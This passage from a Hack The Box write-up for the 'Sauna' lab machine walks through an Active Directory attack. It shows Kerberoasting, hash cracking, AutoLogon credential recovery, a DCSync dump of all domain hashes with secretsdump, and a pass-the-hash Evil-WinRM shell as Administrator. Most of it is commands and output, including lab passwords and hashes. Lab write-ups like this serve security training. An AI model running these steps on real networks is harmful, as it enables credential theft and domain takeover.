+SMB         10.129.95.180   445    SAUNA            [*] Writing 6 local users to users.txt</code></pre><p>This has dumped all the users and exported them for me!</p><h2>Kerberoasting</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +7h nxc ldap SAUNA.EGOTISTICAL-BANK.LOCAL -u &#39;fsmith&#39; -p &#39;Thestrokes23&#39; --kerberoasting kerb.hash
+LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:None) (channel binding:No TLS cert)
+LDAP        10.129.95.180   389    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
+LDAP        10.129.95.180   389    SAUNA            [*] Skipping disabled account: krbtgt
+LDAP        10.129.95.180   389    SAUNA            [*] Total of records returned 1
+LDAP        10.129.95.180   389    SAUNA            [*] sAMAccountName: HSmith, memberOf: [], pwdLastSet: 2020-01-23 05:54:34.140321, lastLogon: &lt;never&gt;
+LDAP        10.129.95.180   389    SAUNA            $krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$EGOTISTICAL-BANK.LOCAL\HSmith*$745d1bd61a46b436f4a6c05bc5bce0b5$39ada6ab9955e7fcff8d725c0975760aa567e1ca64e8c55356c035c9c96ab8b4b98d23de4ba5006f884e0e7138f7206393166796d48d87ac0c71c1de9e35c2bbcd52c5ad8f6abe2dfe6e1b4991945c04807c3eec7a4b6f95f90b8beac435d6239683de74cf942aae2936afb938099f355e8a8c02fcf39724a49dd831ce5d24fea1ae0d636eac74dba64faa4e35cc1bfda483a876f297fc66ffccfca62cd4e7bc7af5641c7043fdfae473e418716f1befdfc81b636229a39d402574f5b6cd4ad5928fbb1f8a13ed79a8216ed18cc0593273d05b1d08378b5c20f49bf5d3f7dcfc18bd7b68e1eba0b1e590d6423f1a69439a1a2bd616c350080799e7dc6018d48d5a2d69007227793dd32ccfa7e9177f5143febed23fdcffab7ec6b106d87493b1cdcf1d1e6a70e7fe319f7a6e6846dfb854e4437ce106742461dd14e60a7830a42f16ddf48d3505379c7feda23fa8336d25e8bced868f75b191068f5720af79adfd213cc3de9067adea57b06422a8c09d8d2d690c4dc91fe59fa017a4a508b8180b799f3d5311f1d3bd82a2045c5f393fd7ede8da83b6c6e68a367a0a47e052d5ed5cc7491ad31e6397f1aa6b348179680ac777fd02eea6b6f460deb12353fae29f7c0320f2bf2a5ecc323e3ad5cfca9a746b17ac71fcc5d1d4a9acd52787292835d7c3374c0dd0531322b8369041e20e1a04598c0f67176f07c4a36f2541540ad8cea59dc07111bb121f0cd590e41c6125df88c4a619181104620bbd9f35fb53cb3f903ed2e7121f839f5562dd4179068a73953d35386246b690ae1c8c715327d24d72770ba3a115ab747657c8ef26d087718f61fe814247b516c6c7f00bb37b950b5039272acbef53f60fdab5e30ab35adce9135b705149035f002ace3aa2b800d7e2ad9418e4c5388d35eb9e83391281324ebf482f3230c2085d0ae1f6135adbb08b3f5274ab8a4a5ed534ce609f881b39ee70e8abe14bffb28057b31c3fcb0d3bce12fb345cf642c9151deff6eca97936fa69c63d5201c87874e32d5a710370140fe1dac0b2121c910d30da561eceb4cdaf626304c1fceee1b6ee0173a6e9b24a8cd7bcdd2cbb3a1c4614286c662f59c169dfd63d05ba49aeb61edddff7ed2490ba76d7553040831e6cd8d64de271a9024933b253dab82c306c1158136912b8814b7fbbe4197121a916e84a243b7fc53822d05802987e522fa21f0a6d5524528f0e62f7440c8f6f349dc048a4a1bd33fdd221792a097f23ef79d7a6122a3e8b0795568146ec399681a4281ca44f127e6d4602bca559043d6ad8361db6ce3de8e7428e03bc6c20ed9bc24e3139514b8f7bd2ae89cec6e0875330913e167faa712ee1f3768e4bd9225bc6dc1b41a591aecc0c2a56a4e807d860b93e909085bda379194d6c</code></pre><p>Ive got a hash via kerberoasting</p><h3>Cracking the hash</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">hashcat kerb.hash /usr/share/wordlists/rockyou.txt
+
+$krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$EGOTISTICAL-BANK.LOCAL\HSmith*$745d1bd61a46b436f4a6c05bc5bce0b5$39ada6ab9955e7fcff8d725c0975760aa567e1ca64e8c55356c035c9c96ab8b4b98d23de4ba5006f884e0e7138f7206393166796d48d87ac0c71c1de9e35c2bbcd52c5ad8f6abe2dfe6e1b4991945c04807c3eec7a4b6f95f90b8beac435d6239683de74cf942aae2936afb938099f355e8a8c02fcf39724a49dd831ce5d24fea1ae0d636eac74dba64faa4e35cc1bfda483a876f297fc66ffccfca62cd4e7bc7af5641c7043fdfae473e418716f1befdfc81b636229a39d402574f5b6cd4ad5928fbb1f8a13ed79a8216ed18cc0593273d05b1d08378b5c20f49bf5d3f7dcfc18bd7b68e1eba0b1e590d6423f1a69439a1a2bd616c350080799e7dc6018d48d5a2d69007227793dd32ccfa7e9177f5143febed23fdcffab7ec6b106d87493b1cdcf1d1e6a70e7fe319f7a6e6846dfb854e4437ce106742461dd14e60a7830a42f16ddf48d3505379c7feda23fa8336d25e8bced868f75b191068f5720af79adfd213cc3de9067adea57b06422a8c09d8d2d690c4dc91fe59fa017a4a508b8180b799f3d5311f1d3bd82a2045c5f393fd7ede8da83b6c6e68a367a0a47e052d5ed5cc7491ad31e6397f1aa6b348179680ac777fd02eea6b6f460deb12353fae29f7c0320f2bf2a5ecc323e3ad5cfca9a746b17ac71fcc5d1d4a9acd52787292835d7c3374c0dd0531322b8369041e20e1a04598c0f67176f07c4a36f2541540ad8cea59dc07111bb121f0cd590e41c6125df88c4a619181104620bbd9f35fb53cb3f903ed2e7121f839f5562dd4179068a73953d35386246b690ae1c8c715327d24d72770ba3a115ab747657c8ef26d087718f61fe814247b516c6c7f00bb37b950b5039272acbef53f60fdab5e30ab35adce9135b705149035f002ace3aa2b800d7e2ad9418e4c5388d35eb9e83391281324ebf482f3230c2085d0ae1f6135adbb08b3f5274ab8a4a5ed534ce609f881b39ee70e8abe14bffb28057b31c3fcb0d3bce12fb345cf642c9151deff6eca97936fa69c63d5201c87874e32d5a710370140fe1dac0b2121c910d30da561eceb4cdaf626304c1fceee1b6ee0173a6e9b24a8cd7bcdd2cbb3a1c4614286c662f59c169dfd63d05ba49aeb61edddff7ed2490ba76d7553040831e6cd8d64de271a9024933b253dab82c306c1158136912b8814b7fbbe4197121a916e84a243b7fc53822d05802987e522fa21f0a6d5524528f0e62f7440c8f6f349dc048a4a1bd33fdd221792a097f23ef79d7a6122a3e8b0795568146ec399681a4281ca44f127e6d4602bca559043d6ad8361db6ce3de8e7428e03bc6c20ed9bc24e3139514b8f7bd2ae89cec6e0875330913e167faa712ee1f3768e4bd9225bc6dc1b41a591aecc0c2a56a4e807d860b93e909085bda379194d6c:Thestrokes23</code></pre><p>This appears to be the same password</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">hsmith:Thestrokes23</code></pre><p>Now ill test these creds, it might also be worth running a password spray against all these users and see if this password is set anywhere else</p><h2>Compromising <code>hsmith</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb SAUNA.EGOTISTICAL-BANK.LOCAL -u &#39;hsmith&#39; -p &#39;Thestrokes23&#39; --shares      
+SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\hsmith:Thestrokes23 
+SMB         10.129.95.180   445    SAUNA            [*] Enumerated shares
+SMB         10.129.95.180   445    SAUNA            Share           Permissions     Remark
+SMB         10.129.95.180   445    SAUNA            -----           -----------     ------
+SMB         10.129.95.180   445    SAUNA            ADMIN$                          Remote Admin
+SMB         10.129.95.180   445    SAUNA            C$                              Default share
+SMB         10.129.95.180   445    SAUNA            IPC$            READ            Remote IPC
+SMB         10.129.95.180   445    SAUNA            NETLOGON        READ            Logon server share 
+SMB         10.129.95.180   445    SAUNA            print$          READ            Printer Drivers
+SMB         10.129.95.180   445    SAUNA            RICOH Aficio SP 8300DN PCL 6 WRITE           We cant print money
+SMB         10.129.95.180   445    SAUNA            SYSVOL          READ            Logon server share</code></pre><p>Its also worth noting this password is only applied for these two accounts The user does not have access over WINRM</p><h2>Bloodhound</h2><p>The user <code>fsmith</code> is part of the remote management users group, which means i should be able to get access via winrm Neither of the compromised users are part of any interesting groups</p><h2>Compromising <code>svc_loanmgr</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS HKLM:\software\microsoft\windows nt\currentversion\winlogon&gt; get-item -path .
+
+
+    Hive: HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion
+
+
+Name                           Property
+----                           --------
+winlogon                       AutoRestartShell             : 1
+                               Background                   : 0 0 0
+                               CachedLogonsCount            : 10
+                               DebugServerCommand           : no
+                               DefaultDomainName            : EGOTISTICALBANK
+                               DefaultUserName              : EGOTISTICALBANK\svc_loanmanager
+                               DisableBackButton            : 1
+                               EnableSIHostIntegration      : 1
+                               ForceUnlockLogon             : 0
+                               LegalNoticeCaption           :
+                               LegalNoticeText              :
+                               PasswordExpiryWarning        : 5
+                               PowerdownAfterShutdown       : 0
+                               PreCreateKnownFolders        : {A520A1A4-1780-4FF6-BD18-167343C5AF16}
+                               ReportBootOk                 : 1
+                               Shell                        : explorer.exe
+                               ShellCritical                : 0
+                               ShellInfrastructure          : sihost.exe
+                               SiHostCritical               : 0
+                               SiHostReadyTimeOut           : 0
+                               SiHostRestartCountLimit      : 0
+                               SiHostRestartTimeGap         : 0
+                               Userinit                     : C:\Windows\system32\userinit.exe,
+                               VMApplet                     : SystemPropertiesPerformance.exe /pagefile
+                               WinStationsDisabled          : 0
+                               scremoveoption               : 0
+                               DisableCAD                   : 1
+                               LastLogOffEndTimePerfCounter : 2358450679
+                               ShutdownFlags                : 2147484203
+                               DisableLockWorkstation       : 0
+                               DefaultPassword              : Moneymakestheworldgoround!</code></pre><p>Found some creds for the user</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">svc_loanmgr:Moneymakestheworldgoround!</code></pre><p>Ill verify these creds</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb SAUNA.EGOTISTICAL-BANK.LOCAL -u &#39;svc_loanmgr&#39; -p &#39;Moneymakestheworldgoround!&#39; 
+SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround!</code></pre><p>This user is compromised Now looking at this user on bloodhound i have some interesting privileges</p><h2>DCSync leads to full domain compromise</h2><p>The new user has GetChanges and GetChangesAll on the domain <img src="images/sauna/pasted-image-20260406002645.webp" alt="Screenshot" loading="lazy" /></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">secretsdump.py &#39;egotistical-bank.local&#39;/&#39;svc_loanmgr&#39;:&#39;Moneymakestheworldgoround!&#39;@&#39;sauna.egotistical-bank.local&#39;
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:3dbde6323671c4b15194978ab5b7ba9b:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
+Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
+Administrator:des-cbc-md5:fb8f321c64cea87f
+krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
+krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
+krbtgt:des-cbc-md5:c170d5dc3edfc1d9
+EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
+EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
+EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
+EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
+EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
+EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
+SAUNA$:aes256-cts-hmac-sha1-96:4f3324e01311d0ef85f68ab33895623595b353653866dabd8ce97a600762ae43
+SAUNA$:aes128-cts-hmac-sha1-96:beff6a053a31ac683ab07d296eeb6666
+SAUNA$:des-cbc-md5:104c515b86739e08
+[*] Cleaning up...</code></pre><p>Here ive dumped all the hashes on the domain</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i egotistical-bank.local -u administrator -H &#39;823452073d75b9d1cf70ebdf86c7f98e&#39;
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; </code></pre><p>Full domain compromise!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-retrotwo/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">RetroTwo</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-sendai/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Sendai</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
